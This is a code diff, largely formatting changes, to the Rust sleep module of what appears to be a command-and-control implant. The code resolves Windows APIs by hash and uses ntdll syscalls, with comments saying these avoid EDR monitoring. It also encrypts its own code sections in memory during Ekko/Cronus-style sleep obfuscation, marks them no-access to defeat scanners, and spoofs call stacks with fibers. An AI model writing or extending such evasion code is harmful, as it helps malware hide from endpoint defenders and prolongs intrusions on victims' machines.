@@ -1,5 +1,5 @@
-use common::config::SleepConfig;
 use anyhow::Result;
+use common::config::SleepConfig;
 #[cfg(windows)]
 use common::config::SleepMethod;
 use log::debug;
@@ -10,10 +10,10 @@ use rand::{thread_rng, Rng, RngCore as _};
 #[cfg(windows)]
 mod win_constants {
     pub const PAGE_READWRITE: u32 = 0x04;
-    pub const PAGE_NOACCESS: u32  = 0x01;
-    pub const MEM_COMMIT: u32     = 0x1000;
-    pub const MEM_RESERVE: u32    = 0x2000;
-    pub const MEM_RELEASE: u32    = 0x8000;
+    pub const PAGE_NOACCESS: u32 = 0x01;
+    pub const MEM_COMMIT: u32 = 0x1000;
+    pub const MEM_RESERVE: u32 = 0x2000;
+    pub const MEM_RELEASE: u32 = 0x8000;
 }
 #[cfg(windows)]
 use win_constants::*;
@@ -27,17 +27,17 @@ mod win_resolve {
 
     // P2-04: Removed HASH_VIRTUALALLOC/HASH_VIRTUALFREE/HASH_VIRTUALPROTECT
     // and their type aliases — all memory operations now use Nt* syscalls.
-    pub const HASH_NTALLOCATEVIRTUALMEMORY: u32  = hash_str_const(b"NtAllocateVirtualMemory\0");
-    pub const HASH_NTFREEVIRTUALMEMORY: u32      = hash_str_const(b"NtFreeVirtualMemory\0");
-    pub const HASH_NTPROTECTVIRTUALMEMORY: u32   = hash_str_const(b"NtProtectVirtualMemory\0");
-    pub const HASH_CONVERTTHREADTOFIBER: u32  = hash_str_const(b"ConvertThreadToFiber\0");
-    pub const HASH_CREATEFIBER: u32           = hash_str_const(b"CreateFiber\0");
-    pub const HASH_SWITCHTOFIBER: u32         = hash_str_const(b"SwitchToFiber\0");
-    pub const HASH_CONVERTFIBERTOTHREAD: u32  = hash_str_const(b"ConvertFiberToThread\0");
-    pub const HASH_DELETEFIBER: u32           = hash_str_const(b"DeleteFiber\0");
+    pub const HASH_NTALLOCATEVIRTUALMEMORY: u32 = hash_str_const(b"NtAllocateVirtualMemory\0");
+    pub const HASH_NTFREEVIRTUALMEMORY: u32 = hash_str_const(b"NtFreeVirtualMemory\0");
+    pub const HASH_NTPROTECTVIRTUALMEMORY: u32 = hash_str_const(b"NtProtectVirtualMemory\0");
+    pub const HASH_CONVERTTHREADTOFIBER: u32 = hash_str_const(b"ConvertThreadToFiber\0");
+    pub const HASH_CREATEFIBER: u32 = hash_str_const(b"CreateFiber\0");
+    pub const HASH_SWITCHTOFIBER: u32 = hash_str_const(b"SwitchToFiber\0");
+    pub const HASH_CONVERTFIBERTOTHREAD: u32 = hash_str_const(b"ConvertFiberToThread\0");
+    pub const HASH_DELETEFIBER: u32 = hash_str_const(b"DeleteFiber\0");
     // P1-02: Removed HASH_SLEEP — kernel32!Sleep is heavily monitored by EDR.
     // Sleep is now performed via NtDelayExecution resolved from ntdll.
-    pub const HASH_GETLOCALTIME: u32          = hash_str_const(b"GetLocalTime\0");
+    pub const HASH_GETLOCALTIME: u32 = hash_str_const(b"GetLocalTime\0");
 
     // P2-04: Removed legacy kernel32 FnVirtualAlloc/FnVirtualFree/FnVirtualProtect
     // type aliases — all memory operations now use Nt* syscalls.
@@ -46,38 +46,43 @@ mod win_resolve {
     // NtAllocateVirtualMemory(ProcessHandle, BaseAddress*, RegionSize*,
     //   AllocationType, Protect) -> NTSTATUS
     pub type FnNtAllocateVirtualMemory = unsafe extern "system" fn(
-        usize,                         // ProcessHandle
-        *mut *mut std::ffi::c_void,    // BaseAddress
-        *mut usize,                    // RegionSize
-        u32,                           // AllocationType
-        u32,                           // Protect
+        usize,                      // ProcessHandle
+        *mut *mut std::ffi::c_void, // BaseAddress
+        *mut usize,                 // RegionSize
+        u32,                        // AllocationType
+        u32,                        // Protect
     ) -> i32;
     // NtFreeVirtualMemory(ProcessHandle, BaseAddress*, RegionSize*,
     //   FreeType) -> NTSTATUS
     pub type FnNtFreeVirtualMemory = unsafe extern "system" fn(
-        usize,                         // ProcessHandle
-        *mut *mut std::ffi::c_void,    // BaseAddress
-        *mut usize,                    // RegionSize
-        u32,                           // FreeType
+        usize,                      // ProcessHandle
+        *mut *mut std::ffi::c_void, // BaseAddress
+        *mut usize,                 // RegionSize
+        u32,                        // FreeType
     ) -> i32;
     // NtProtectVirtualMemory(ProcessHandle, BaseAddress*, RegionSize*,
     //   NewProtect, OldProtect*) -> NTSTATUS
     pub type FnNtProtectVirtualMemory = unsafe extern "system" fn(
-        usize,                         // ProcessHandle
-        *mut *mut std::ffi::c_void,    // BaseAddress
-        *mut usize,                    // RegionSize
-        u32,                           // NewProtect
-        *mut u32,                      // OldProtect
+        usize,                      // ProcessHandle
+        *mut *mut std::ffi::c_void, // BaseAddress
+        *mut usize,                 // RegionSize
+        u32,                        // NewProtect
+        *mut u32,                   // OldProtect
     ) -> i32;
-    pub type FnConvertThreadToFiber  = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
-    pub type FnCreateFiber          = unsafe extern "system" fn(usize, Option<unsafe extern "system" fn(*mut std::ffi::c_void)>, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
-    pub type FnSwitchToFiber        = unsafe extern "system" fn(*mut std::ffi::c_void);
+    pub type FnConvertThreadToFiber =
+        unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+    pub type FnCreateFiber = unsafe extern "system" fn(
+        usize,
+        Option<unsafe extern "system" fn(*mut std::ffi::c_void)>,
+        *mut std::ffi::c_void,
+    ) -> *mut std::ffi::c_void;
+    pub type FnSwitchToFiber = unsafe extern "system" fn(*mut std::ffi::c_void);
     pub type FnConvertFiberToThread = unsafe extern "system" fn() -> i32;
-    pub type FnDeleteFiber          = unsafe extern "system" fn(*mut std::ffi::c_void);
+    pub type FnDeleteFiber = unsafe extern "system" fn(*mut std::ffi::c_void);
     // P1-02: Removed FnSleep (kernel32!Sleep).  Sleep is now performed via
     // NtDelayExecution (ntdll indirect syscall) to avoid EDR-monitored API.
     pub type FnNtDelayExecution = unsafe extern "system" fn(i32, *mut i64) -> i32;
-    pub type FnGetLocalTime     = unsafe extern "system" fn(*mut crate::win_types::SYSTEMTIME);
+    pub type FnGetLocalTime = unsafe extern "system" fn(*mut crate::win_types::SYSTEMTIME);
 
     /// Resolve a kernel32 function by hash.
     pub unsafe fn resolve_kernel32<T>(fn_hash: u32) -> Result<T> {
@@ -112,7 +117,10 @@ static NTDELAY_PTR: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64:
 static SWITCHTOFIBER_PTR: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
 
 pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
-    let mut base = config.base_interval_secs as f64;
+    let mut base = config
+        .base_interval_ms
+        .map(|ms| ms as f64 / 1000.0)
+        .unwrap_or(config.base_interval_secs as f64);
     if let (Some(start), Some(end), Some(mult)) = (
         config.working_hours_start,
         config.working_hours_end,
@@ -179,10 +187,7 @@ pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Res
             // Ekko/Foliage path.
             #[cfg(target_arch = "x86_64")]
             {
-                info!(
-                    "Initiating advanced sleep obfuscation for {:?}",
-                    duration
-                );
+                info!("Initiating advanced sleep obfuscation for {:?}", duration);
                 let mut soc = crate::sleep_obfuscation::SleepObfuscationConfig::default();
                 soc.sleep_duration_ms = duration.as_millis() as u64;
                 soc.encrypt_stack = config.sleep_mask_enabled;
@@ -218,10 +223,7 @@ pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Res
             // Falls back to Ekko if timer APIs unavailable.
             #[cfg(target_arch = "x86_64")]
             {
-                info!(
-                    "Initiating Cronus sleep obfuscation for {:?}",
-                    duration
-                );
+                info!("Initiating Cronus sleep obfuscation for {:?}", duration);
                 let mut soc = crate::sleep_obfuscation::SleepObfuscationConfig::default();
                 soc.sleep_duration_ms = duration.as_millis() as u64;
                 soc.encrypt_stack = config.sleep_mask_enabled;
@@ -348,7 +350,11 @@ pub mod crypto {
     #[cfg(not(windows))]
     unsafe fn alloc_key_page() -> (*mut u8, usize) {
         let page_size = libc::sysconf(libc::_SC_PAGESIZE);
-        let page_size = if page_size > 0 { page_size as usize } else { 4096 };
+        let page_size = if page_size > 0 {
+            page_size as usize
+        } else {
+            4096
+        };
         let ptr = libc::mmap(
             std::ptr::null_mut(),
             page_size,
@@ -358,7 +364,10 @@ pub mod crypto {
             0,
         );
         if ptr == libc::MAP_FAILED {
-            log::error!("alloc_key_page: mmap failed: {}", std::io::Error::last_os_error());
+            log::error!(
+                "alloc_key_page: mmap failed: {}",
+                std::io::Error::last_os_error()
+            );
             return (std::ptr::null_mut(), 0);
         }
         (ptr as *mut u8, page_size)
@@ -375,14 +384,17 @@ pub mod crypto {
         let mut base: *mut std::ffi::c_void = std::ptr::null_mut();
         let mut region_size = page_size;
         let status = nt_alloc(
-            (-1isize) as usize,            // NtCurrentProcess()
+            (-1isize) as usize, // NtCurrentProcess()
             &mut base,
             &mut region_size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
         if status != 0 || base.is_null() {
-            log::error!("alloc_key_page: NtAllocateVirtualMemory failed (status={})", status);
+            log::error!(
+                "alloc_key_page: NtAllocateVirtualMemory failed (status={})",
+                status
+            );
             return (std::ptr::null_mut(), 0);
         }
         (base as *mut u8, page_size)
@@ -410,13 +422,16 @@ pub mod crypto {
             let mut base = page as *mut std::ffi::c_void;
             let mut region_size = 0usize;
             let status = nt_free(
-                (-1isize) as usize,        // NtCurrentProcess()
+                (-1isize) as usize, // NtCurrentProcess()
                 &mut base,
                 &mut region_size,
                 MEM_RELEASE,
             );
             if status != 0 {
-                log::error!("free_key_page: NtFreeVirtualMemory failed (status={})", status);
+                log::error!(
+                    "free_key_page: NtFreeVirtualMemory failed (status={})",
+                    status
+                );
             }
         }
     }
@@ -424,7 +439,12 @@ pub mod crypto {
     // ── Memory-protection helpers ─────────────────────────────────────────
 
     #[cfg(windows)]
-    pub(super) unsafe fn protect_region(addr: *mut u8, size: usize, new_protect: u32, old_protect: &mut u32) -> bool {
+    pub(super) unsafe fn protect_region(
+        addr: *mut u8,
+        size: usize,
+        new_protect: u32,
+        old_protect: &mut u32,
+    ) -> bool {
         let mut region_size = size;
         let mut base_addr = addr as *mut std::ffi::c_void;
 
@@ -440,7 +460,9 @@ pub mod crypto {
             if status != 0 {
                 log::error!(
                     "NtProtectVirtualMemory failed for {:p} (size={}) status={}",
-                    addr, size, status
+                    addr,
+                    size,
+                    status
                 );
                 return false;
             }
@@ -456,7 +478,7 @@ pub mod crypto {
             let mut prot_base = base_addr;
             let mut prot_size = region_size;
             let status = nt_protect(
-                (-1isize) as usize,        // NtCurrentProcess()
+                (-1isize) as usize, // NtCurrentProcess()
                 &mut prot_base,
                 &mut prot_size,
                 new_protect,
@@ -465,7 +487,9 @@ pub mod crypto {
             if status != 0 {
                 log::error!(
                     "NtProtectVirtualMemory failed for {:p} (size={}) status={}",
-                    addr, size, status
+                    addr,
+                    size,
+                    status
                 );
                 return false;
             }
@@ -476,13 +500,18 @@ pub mod crypto {
     #[cfg(not(windows))]
     pub(super) unsafe fn protect_region(addr: *mut u8, size: usize, prot: i32) -> bool {
         let page_size = libc::sysconf(libc::_SC_PAGESIZE);
-        let page_size = if page_size > 0 { page_size as usize } else { 4096usize };
+        let page_size = if page_size > 0 {
+            page_size as usize
+        } else {
+            4096usize
+        };
         let aligned = (addr as usize) & !(page_size - 1);
         let aligned_size = ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
         if libc::mprotect(aligned as *mut libc::c_void, aligned_size, prot) != 0 {
             log::error!(
                 "mprotect failed for {:p} (size={}): {}",
-                addr, size,
+                addr,
+                size,
                 std::io::Error::last_os_error()
             );
             return false;
@@ -587,7 +616,10 @@ pub mod crypto {
             let peb = *((teb + 0x60) as *const usize) as *const u8;
             *(peb.add(0x10) as *const usize) as *mut _
         };
-        #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
+        #[cfg(not(any(
+            target_arch = "x86_64",
+            all(target_arch = "aarch64", target_os = "windows")
+        )))]
         let base: *mut std::ffi::c_void = std::ptr::null_mut();
         if base.is_null() {
             return sections;
@@ -641,18 +673,30 @@ pub mod crypto {
                 continue;
             }
             let mut fields = line.split_whitespace();
-            let addr_range = match fields.next() { Some(r) => r, None => continue };
-            let perms = match fields.next() { Some(p) => p, None => continue };
+            let addr_range = match fields.next() {
+                Some(r) => r,
+                None => continue,
+            };
+            let perms = match fields.next() {
+                Some(p) => p,
+                None => continue,
+            };
             let orig_prot = {
                 let exec = perms.as_bytes().get(2).copied() == Some(b'x');
-                if exec { libc::PROT_READ | libc::PROT_EXEC } else { libc::PROT_READ }
+                if exec {
+                    libc::PROT_READ | libc::PROT_EXEC
+                } else {
+                    libc::PROT_READ
+                }
             };
             let mut parts = addr_range.splitn(2, '-');
             let start_hex = parts.next().unwrap_or("0");
             let end_hex = parts.next().unwrap_or("0");
             let start = usize::from_str_radix(start_hex, 16).unwrap_or(0);
-            let end   = usize::from_str_radix(end_hex,   16).unwrap_or(0);
-            if start == 0 || end <= start { continue; }
+            let end = usize::from_str_radix(end_hex, 16).unwrap_or(0);
+            if start == 0 || end <= start {
+                continue;
+            }
             sections.push((start as *mut u8, end - start, orig_prot));
         }
         sections
@@ -670,7 +714,9 @@ pub mod crypto {
 
         #[cfg(not(feature = "memory-guard"))]
         unsafe {
-            ENCRYPTED_SECTIONS.with(|s| { s.borrow_mut().clear(); });
+            ENCRYPTED_SECTIONS.with(|s| {
+                s.borrow_mut().clear();
+            });
             SESSION_INITIALIZED.with(|c| c.set(false));
 
             // Allocate a separate page to hold the session key.
@@ -691,7 +737,9 @@ pub mod crypto {
 
             let mut encrypted_count = 0usize;
             for (addr, size) in get_code_sections() {
-                if addr.is_null() || size == 0 { continue; }
+                if addr.is_null() || size == 0 {
+                    continue;
+                }
 
                 let mut old_protect = 0u32;
                 if !protect_region(addr, size, PAGE_READWRITE, &mut old_protect) {
@@ -711,14 +759,11 @@ pub mod crypto {
                     let nonce = XNonce::from_slice(&nonce_bytes);
                     let plaintext = std::slice::from_raw_parts(addr, size);
                     // AEAD encrypt produces ciphertext + 16-byte tag.
-                    let mut ct_and_tag = cipher.encrypt(nonce, plaintext)
+                    let mut ct_and_tag = cipher
+                        .encrypt(nonce, plaintext)
                         .expect("XChaCha20-Poly1305 encryption failed");
                     // Copy ciphertext (without tag) back to the section in-place.
-                    std::ptr::copy_nonoverlapping(
-                        ct_and_tag.as_ptr(),
-                        addr,
-                        size,
-                    );
+                    std::ptr::copy_nonoverlapping(ct_and_tag.as_ptr(), addr, size);
                     // Extract the 16-byte Poly1305 tag from the tail.
                     let mut tag = [0u8; AEAD_TAG_LEN];
                     tag.copy_from_slice(&ct_and_tag[size..]);
@@ -792,12 +837,14 @@ pub mod crypto {
             }
             SESSION_INITIALIZED.with(|c| c.set(false));
 
-            let kp    = KEY_PAGE.with(|c| c.get());
+            let kp = KEY_PAGE.with(|c| c.get());
             let kplen = KEY_PAGE_LEN.with(|c| c.get());
 
             let sections = ENCRYPTED_SECTIONS.with(|s| std::mem::take(&mut *s.borrow_mut()));
             for mut section in sections {
-                if section.addr.is_null() || section.size == 0 { continue; }
+                if section.addr.is_null() || section.size == 0 {
+                    continue;
+                }
 
                 let mut rw_prev = 0u32;
                 if !protect_region(section.addr, section.size, PAGE_READWRITE, &mut rw_prev) {
@@ -847,7 +894,12 @@ pub mod crypto {
                 std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; AEAD_NONCE_LEN]);
 
                 let mut restore_prev = 0u32;
-                let _ = protect_region(section.addr, section.size, section.orig_prot, &mut restore_prev);
+                let _ = protect_region(
+                    section.addr,
+                    section.size,
+                    section.orig_prot,
+                    &mut restore_prev,
+                );
             }
 
             // Zero and release the key page.
@@ -862,7 +914,9 @@ pub mod crypto {
     #[cfg(not(windows))]
     pub fn encrypt_sections() {
         unsafe {
-            ENCRYPTED_SECTIONS.with(|s| { s.borrow_mut().clear(); });
+            ENCRYPTED_SECTIONS.with(|s| {
+                s.borrow_mut().clear();
+            });
             SESSION_INITIALIZED.with(|c| c.set(false));
 
             // Allocate a private anonymous page to hold the session key.
@@ -885,7 +939,9 @@ pub mod crypto {
 
             let mut encrypted_count = 0usize;
             for (addr, size, orig_prot) in get_code_sections() {
-                if addr.is_null() || size == 0 { continue; }
+                if addr.is_null() || size == 0 {
+                    continue;
+                }
 
                 // Make region writable so we can encrypt it in-place.
                 if !protect_region(addr, size, libc::PROT_READ | libc::PROT_WRITE) {
@@ -905,14 +961,11 @@ pub mod crypto {
                     let nonce = XNonce::from_slice(&nonce_bytes);
                     let plaintext = std::slice::from_raw_parts(addr, size);
                     // AEAD encrypt produces ciphertext + 16-byte tag.
-                    let mut ct_and_tag = cipher.encrypt(nonce, plaintext)
+                    let mut ct_and_tag = cipher
+                        .encrypt(nonce, plaintext)
                         .expect("XChaCha20-Poly1305 encryption failed");
                     // Copy ciphertext (without tag) back to the section in-place.
-                    std::ptr::copy_nonoverlapping(
-                        ct_and_tag.as_ptr(),
-                        addr,
-                        size,
-                    );
+                    std::ptr::copy_nonoverlapping(ct_and_tag.as_ptr(), addr, size);
                     // Extract the 16-byte Poly1305 tag from the tail.
                     let mut tag = [0u8; AEAD_TAG_LEN];
                     tag.copy_from_slice(&ct_and_tag[size..]);
@@ -977,14 +1030,20 @@ pub mod crypto {
             }
             SESSION_INITIALIZED.with(|c| c.set(false));
 
-            let kp    = KEY_PAGE.with(|c| c.get());
+            let kp = KEY_PAGE.with(|c| c.get());
             let kplen = KEY_PAGE_LEN.with(|c| c.get());
 
             let sections = ENCRYPTED_SECTIONS.with(|s| std::mem::take(&mut *s.borrow_mut()));
             for mut section in sections {
-                if section.addr.is_null() || section.size == 0 { continue; }
+                if section.addr.is_null() || section.size == 0 {
+                    continue;
+                }
 
-                if !protect_region(section.addr, section.size, libc::PROT_READ | libc::PROT_WRITE) {
+                if !protect_region(
+                    section.addr,
+                    section.size,
+                    libc::PROT_READ | libc::PROT_WRITE,
+                ) {
                     std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; AEAD_NONCE_LEN]);
                     continue;
                 }
@@ -1054,8 +1113,8 @@ pub mod stack_mask {
     #[cfg(windows)]
     use super::{PAGE_NOACCESS, PAGE_READWRITE};
 
-    use chacha20::ChaCha20;
     use chacha20::cipher::{KeyIvInit, StreamCipher};
+    use chacha20::ChaCha20;
     use rand::RngCore;
 
     /// Per-section state required to decrypt after sleep.
@@ -1087,12 +1146,7 @@ pub mod stack_mask {
                 continue;
             }
             let mut orig_prot = 0u32;
-            if !super::crypto::protect_region(
-                addr,
-                size,
-                PAGE_READWRITE,
-                &mut orig_prot,
-            ) {
+            if !super::crypto::protect_region(addr, size, PAGE_READWRITE, &mut orig_prot) {
                 continue;
             }
             let mut nonce = [0u8; 12];
@@ -1109,13 +1163,13 @@ pub mod stack_mask {
             // from reading high-entropy encrypted data.  The original protection
             // is saved in the SectionEntry and restored by decrypt_with_key().
             let mut dummy = 0u32;
-            let _ = super::crypto::protect_region(
+            let _ = super::crypto::protect_region(addr, size, PAGE_NOACCESS, &mut dummy);
+            result.push(SectionEntry {
                 addr,
-                size,
-                PAGE_NOACCESS,
-                &mut dummy,
-            );
-            result.push(SectionEntry { addr, len: size, orig_prot, nonce });
+                len: size,
+                orig_prot,
+                nonce,
+            });
         }
         result
     }
@@ -1132,12 +1186,8 @@ pub mod stack_mask {
                 continue;
             }
             let mut dummy = 0u32;
-            if !super::crypto::protect_region(
-                section.addr,
-                section.len,
-                PAGE_READWRITE,
-                &mut dummy,
-            ) {
+            if !super::crypto::protect_region(section.addr, section.len, PAGE_READWRITE, &mut dummy)
+            {
                 core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
                 continue;
             }
@@ -1146,9 +1196,7 @@ pub mod stack_mask {
                     chacha20::Key::from_slice(key),
                     chacha20::Nonce::from_slice(&section.nonce),
                 );
-                cipher.apply_keystream(
-                    std::slice::from_raw_parts_mut(section.addr, section.len),
-                );
+                cipher.apply_keystream(std::slice::from_raw_parts_mut(section.addr, section.len));
             }
             core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
             let mut dummy2 = 0u32;
@@ -1213,16 +1261,11 @@ pub mod stack_mask {
                     chacha20::Key::from_slice(key),
                     chacha20::Nonce::from_slice(&section.nonce),
                 );
-                cipher.apply_keystream(
-                    std::slice::from_raw_parts_mut(section.addr, section.len),
-                );
+                cipher.apply_keystream(std::slice::from_raw_parts_mut(section.addr, section.len));
             }
             core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
-            let _ = super::crypto::protect_region(
-                section.addr,
-                section.len,
-                section.orig_prot as i32,
-            );
+            let _ =
+                super::crypto::protect_region(section.addr, section.len, section.orig_prot as i32);
         }
     }
 }
@@ -1248,9 +1291,8 @@ pub mod spoof {
             let convert_thread_to_fiber: FnConvertThreadToFiber =
                 win_resolve::resolve_kernel32(HASH_CONVERTTHREADTOFIBER)
                     .expect("ConvertThreadToFiber resolve failed");
-            let create_fiber: FnCreateFiber =
-                win_resolve::resolve_kernel32(HASH_CREATEFIBER)
-                    .expect("CreateFiber resolve failed");
+            let create_fiber: FnCreateFiber = win_resolve::resolve_kernel32(HASH_CREATEFIBER)
+                .expect("CreateFiber resolve failed");
             let switch_to_fiber: FnSwitchToFiber =
                 win_resolve::resolve_kernel32(HASH_SWITCHTOFIBER)
                     .expect("SwitchToFiber resolve failed");
@@ -1303,7 +1345,7 @@ pub mod spoof {
                                 let ms = (ns / 1_000_000).max(1) as i64;
                                 let mut large_int = -10_000 * ms; // negative = relative
                                 let nt_delay: FnNtDelayExecution = std::mem::transmute(
-                                    NTDELAY_PTR.load(std::sync::atomic::Ordering::SeqCst)
+                                    NTDELAY_PTR.load(std::sync::atomic::Ordering::SeqCst),
                                 );
                                 nt_delay(0, &mut large_int);
                             }
@@ -1311,7 +1353,7 @@ pub mod spoof {
                             let main = MAIN_FIBER.with(|c| c.get());
                             if !main.is_null() {
                                 let switch_fn: FnSwitchToFiber = std::mem::transmute(
-                                    SWITCHTOFIBER_PTR.load(std::sync::atomic::Ordering::SeqCst)
+                                    SWITCHTOFIBER_PTR.load(std::sync::atomic::Ordering::SeqCst),
                                 );
                                 switch_fn(main);
                             }
@@ -1399,12 +1441,13 @@ thread_local! {
 pub fn cleanup_fibers() {
     #[cfg(windows)]
     {
-        let convert_fiber_to_thread: FnConvertFiberToThread =
-            unsafe { win_resolve::resolve_kernel32(HASH_CONVERTFIBERTOTHREAD)
-                .expect("ConvertFiberToThread resolve failed") };
-        let delete_fiber: FnDeleteFiber =
-            unsafe { win_resolve::resolve_kernel32(HASH_DELETEFIBER)
-                .expect("DeleteFiber resolve failed") };
+        let convert_fiber_to_thread: FnConvertFiberToThread = unsafe {
+            win_resolve::resolve_kernel32(HASH_CONVERTFIBERTOTHREAD)
+                .expect("ConvertFiberToThread resolve failed")
+        };
+        let delete_fiber: FnDeleteFiber = unsafe {
+            win_resolve::resolve_kernel32(HASH_DELETEFIBER).expect("DeleteFiber resolve failed")
+        };
         spoof::SLEEP_FIBER.with(|f| {
             let handle = f.get();
             if !handle.is_null() {
